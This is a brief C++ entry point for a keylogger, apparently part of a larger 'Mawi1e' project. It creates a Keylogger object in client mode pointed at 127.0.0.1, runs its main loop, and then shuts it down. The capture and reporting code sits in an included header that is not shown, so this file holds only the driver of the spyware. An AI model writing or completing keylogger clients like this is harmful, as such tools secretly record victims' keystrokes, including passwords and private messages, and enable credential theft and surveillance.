#include "Keylogger.h"

int main(int argc, char** argv) {
	Mawi1e::Keylogger* keylogger = new Mawi1e::Keylogger;

	if (keylogger->Initialize(_Mawi1e_KEYLOGGER_CLIENT, "127.0.0.1")) {
		keylogger->Frame();
	}

	keylogger->Shutdown();
	delete keylogger;
	keylogger = nullptr;

	return 0;
}